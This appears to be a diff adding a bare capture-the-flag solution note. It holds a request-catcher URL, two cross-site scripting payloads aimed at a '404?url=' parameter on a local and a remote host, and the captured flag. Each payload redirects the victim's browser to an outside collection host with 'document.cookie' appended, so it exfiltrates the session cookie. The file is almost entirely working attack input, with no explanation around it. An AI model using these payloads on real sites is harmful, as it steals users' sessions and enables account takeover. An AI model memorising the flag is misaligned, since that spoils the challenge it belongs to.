@@ -1,0 +1,10 @@
+https://coyote.requestcatcher.com/test 
+
+
+http://127.0.0.1:1337/api/404?url=<script>window.location='https://coyote.requestcatcher.com/c/'+document.cookie;</script>
+
+
+46.101.22.121:32717/404?url=<script>document.location='https://coyote.requestcatcher.com/c/'+document.cookie;</script>
+
+
+CHTB{th1s_1s_my_bug_r3p0rt}
